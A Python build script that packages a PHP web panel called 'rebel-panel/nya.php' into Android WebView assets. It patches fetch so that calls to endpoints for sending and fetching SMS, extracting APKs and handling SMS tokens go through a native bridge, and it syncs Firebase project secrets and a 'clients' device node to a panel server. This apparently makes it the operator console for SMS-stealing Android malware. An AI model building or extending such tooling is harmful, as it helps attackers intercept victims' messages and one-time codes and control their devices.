#!/usr/bin/env python3
"""Bundle rebel-panel/nya.php into Android WebView assets (fresh APK — no Firebase)."""

from __future__ import annotations

import os
import re
import shutil

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
NYA_PHP = os.path.join(ROOT, "rebel-panel", "nya.php")
NYA_JS = os.path.join(ROOT, "rebel-panel", "nya-firebase.js")
OUT_DIR = os.path.join(ROOT, "app", "src", "main", "assets", "panel")

EMPTY_DEFAULTS = '/** Nya Panel APK — no pre-added Firebase */\nvar REBEL_DEFAULT_FIREBASES = [];\nvar DEFAULT_FIREBASES = REBEL_DEFAULT_FIREBASES;\n'

PANEL_BOOT = """
window.REBEL_NATIVE_APP = true;
window.NYA_APK = true;
window.SERVER_FIREBASES = window.SERVER_FIREBASES || [];

function nyaGetPanelServer() {
  if (window.PANEL_SERVER_URL) return String(window.PANEL_SERVER_URL).replace(/\\/$/, '');
  if (window.RebelAndroid && typeof RebelAndroid.getPanelServerUrl === 'function') {
    try {
      var u = RebelAndroid.getPanelServerUrl();
      if (u) window.PANEL_SERVER_URL = String(u).replace(/\\/$/, '');
    } catch (e) {}
  }
  return window.PANEL_SERVER_URL || '';
}

function nyaAbsUrl(path) {
  var p = String(path || '');
  if (/^https?:\\/\\//i.test(p)) return p;
  var base = nyaGetPanelServer();
  if (!base) return p;
  if (p.charAt(0) === '/') p = p.slice(1);
  return base + '/' + p;
}

function rebelApiPost(endpoint, body) {
  if (window.RebelAndroid && typeof RebelAndroid.apiPost === 'function') {
    try {
      return JSON.parse(RebelAndroid.apiPost(endpoint, JSON.stringify(body || {})));
    } catch (e) {
      return { ok: false, error: String(e) };
    }
  }
  return null;
}

function nyaNativeFetch(path, opts) {
  opts = opts || {};
  var method = (opts.method || 'GET').toUpperCase();
  var body = opts.body;
  if (method === 'POST' && body && !(typeof body === 'string')) {
    try { body = JSON.stringify(body); } catch (e) { body = '{}'; }
  }
  if (window.RebelAndroid && typeof RebelAndroid.panelFetch === 'function') {
    try {
      var payload = { url: nyaAbsUrl(path), method: method, body: body || '' };
      return Promise.resolve(JSON.parse(RebelAndroid.panelFetch(JSON.stringify(payload))));
    } catch (e) {
      return Promise.resolve({ ok: false, error: String(e) });
    }
  }
  var url = nyaAbsUrl(path);
  if (!/^https?:\\/\\//i.test(url)) {
    return Promise.resolve({ ok: false, error: 'Panel server URL not set' });
  }
  return fetch(url, {
    method: method,
    headers: opts.headers || (method === 'POST' ? { 'Content-Type': 'application/json' } : undefined),
    body: method === 'POST' ? body : undefined,
    cache: 'no-store'
  }).then(function (r) {
    return r.json().catch(function () { return { ok: false, error: 'Bad JSON' }; });
  }).catch(function (e) {
    return { ok: false, error: String(e && e.message ? e.message : e) };
  });
}

(function () {
  if (!window.REBEL_NATIVE_APP || window.fetch._nyaPatched) return;
  var orig = window.fetch.bind(window);
  window.fetch = function (input, init) {
    var url = typeof input === 'string' ? input : (input && input.url) || '';
    if (/nya\\.php\\?rebel_(send_sms|fetch_sms|firebase_api|apk_extract|sms_token_api)/i.test(url)) {
      var m = url.match(/rebel_(\\w+)/);
      var ep = m ? 'rebel_' + m[1] : '';
      var method = ((init && init.method) || 'GET').toUpperCase();
      var body = init && init.body;
      if (method === 'POST' && body) {
        try { body = typeof body === 'string' ? JSON.parse(body) : body; } catch (e) { body = {}; }
        var native = rebelApiPost(ep, body);
        if (native) return Promise.resolve({ ok: !!native.ok, json: function () { return Promise.resolve(native); } });
        return nyaNativeFetch(url, { method: 'POST', body: body }).then(function (data) {
          return { ok: !!data.ok, json: function () { return Promise.resolve(data); } };
        });
      }
      if (/rebel_firebase_api/i.test(url) && method === 'GET') {
        return nyaNativeFetch(url).then(function (data) {
          return { ok: !!data.ok, json: function () { return Promise.resolve(data); } };
        });
      }
    }
    return orig(input, init);
  };
  window.fetch._nyaPatched = true;
})();

document.addEventListener('DOMContentLoaded', function () {
  document.body.classList.add('nya-strict-apk');
  document.querySelectorAll('.apk-dl-card, .apk-dl-btn, a[download]').forEach(function (el) {
    el.style.display = 'none';
  });
  if (typeof bindApkUiGestures === 'function') bindApkUiGestures();
});
"""


def read_nya_html() -> str:
    with open(NYA_PHP, encoding="utf-8") as handle:
        content = handle.read()
    start = content.find("<!DOCTYPE")
    if start < 0:
        raise SystemExit("Could not find HTML in nya.php")
    html = content[start:]
    html = re.sub(
        r"<script>var SERVER_FIREBASES=<\?php[^?]*\?>;</script>",
        "<script>var SERVER_FIREBASES=[];</script>",
        html,
        count=1,
    )
    html = html.replace(
        '<script src="firebase_defaults.js"></script>\n<script src="nya-firebase.js"></script>',
        '<script src="firebase_defaults.js"></script>\n'
        '<script src="panel-boot.js"></script>\n'
        '<script src="nya-firebase.js"></script>',
    )
    return html


def patch_nya_js(js: str) -> str:
    if "syncFirebaseToServer" not in js:
        sync_fn = """
function syncFirebaseToServer(cfg){
  if(!cfg||!cfg.databaseURL)return Promise.resolve(null);
  var payload={
    action:'add',
    name:cfg.name||cfg.id||'Firebase',
    databaseURL:(cfg.databaseURL||'').replace(/\\/$/,''),
    secret:cfg.secret||cfg.key||'',
    apiKey:cfg.apiKey||'',
    projectId:cfg.projectId||'',
    appId:cfg.appId||'',
    authDomain:cfg.authDomain||'',
    storageBucket:cfg.storageBucket||'',
    messagingSenderId:cfg.messagingSenderId||'',
    packageName:cfg.packageName||'',
    schema:cfg.schema||'',
    deviceNode:cfg.deviceNode||'clients',
    preferredDeviceNode:cfg.preferredDeviceNode||'',
    deviceNodes:cfg.deviceNodes||[],
    source:'nya_apk'
  };
  if(window.REBEL_NATIVE_APP&&window.RebelAndroid&&typeof RebelAndroid.syncFirebase==='function'){
    try{
      var native=JSON.parse(RebelAndroid.syncFirebase(JSON.stringify(payload)));
      if(native&&native.ok)return Promise.resolve(native);
    }catch(e){}
  }
  return nyaNativeFetch(FIREBASE_API_URL,{method:'POST',body:payload});
}
"""
        js = js.replace("function saveFirebaseConfigs(){", sync_fn + "\nfunction saveFirebaseConfigs(){")
        js = js.replace(
            "function saveFirebaseConfigs(){\n  try{localStorage.setItem(FB_LIST_KEY,JSON.stringify(firebaseConfigs));}catch(e){}\n}",
            "function saveFirebaseConfigs(){\n  try{localStorage.setItem(FB_LIST_KEY,JSON.stringify(firebaseConfigs));}catch(e){}\n  if(window.REBEL_NATIVE_APP&&firebaseConfigs.length){\n    var last=firebaseConfigs[firebaseConfigs.length-1];\n    syncFirebaseToServer(last).then(function(r){\n      if(r&&r.ok)toast('Synced to nya.php server',true);\n    }).catch(function(){});\n  }\n}",
        )
    if "pullServerFirebases" not in js:
        pull_fn = """
function pullServerFirebases(){
  if(!window.REBEL_NATIVE_APP)return Promise.resolve([]);
  return nyaNativeFetch(FIREBASE_API_URL).then(function(res){
    if(!res||!res.ok||!Array.isArray(res.projects))return [];
    return res.projects;
  }).catch(function(){return [];});
}
"""
        js = js.replace("function loadFirebaseConfigs(){", pull_fn + "\nfunction loadFirebaseConfigs(){")
        js = js.replace(
            "  return mergeDefaults((SERVER_FIREBASES||[]).slice());\n}",
            "  if(window.REBEL_NATIVE_APP&&nyaGetPanelServer()){\n    return pullServerFirebases().then(function(serverList){\n      return mergeDefaults((serverList.length?serverList:(SERVER_FIREBASES||[])).slice());\n    });\n  }\n  return Promise.resolve(mergeDefaults((SERVER_FIREBASES||[]).slice()));\n}",
        )
        js = js.replace(
            "function initFirebase(){\n  teardownAllFirebaseInstances();\n  firebaseInstances=[];firebaseConfigs=loadFirebaseConfigs();\n  ensureActiveFbValid();\n  firebaseConfigs.forEach(initFirebaseInstance);\n  updateFbUi();\n}",
            "function initFirebase(){\n  teardownAllFirebaseInstances();\n  firebaseInstances=[];\n  var loaded=loadFirebaseConfigs();\n  function boot(cfgs){\n    firebaseConfigs=cfgs||[];\n    ensureActiveFbValid();\n    firebaseConfigs.forEach(initFirebaseInstance);\n    updateFbUi();\n    if(typeof fetchAllData==='function')fetchAllData(true);\n  }\n  if(loaded&&typeof loaded.then==='function')loaded.then(boot).catch(function(){boot([]);});\n  else boot(loaded||[]);\n}",
        )
    return js


def main() -> None:
    html = read_nya_html()
    js = patch_nya_js(open(NYA_JS, encoding="utf-8").read())

    if os.path.isdir(OUT_DIR):
        shutil.rmtree(OUT_DIR)
    os.makedirs(OUT_DIR, exist_ok=True)

    with open(os.path.join(OUT_DIR, "index.html"), "w", encoding="utf-8") as handle:
        handle.write(html)
    with open(os.path.join(OUT_DIR, "panel-boot.js"), "w", encoding="utf-8") as handle:
        handle.write(PANEL_BOOT.strip() + "\n")
    with open(os.path.join(OUT_DIR, "nya-firebase.js"), "w", encoding="utf-8") as handle:
        handle.write(js)
    with open(os.path.join(OUT_DIR, "firebase_defaults.js"), "w", encoding="utf-8") as handle:
        handle.write(EMPTY_DEFAULTS)

    print(f"Built Nya panel assets in {OUT_DIR} (0 Firebase preloaded)")


if __name__ == "__main__":
    main()
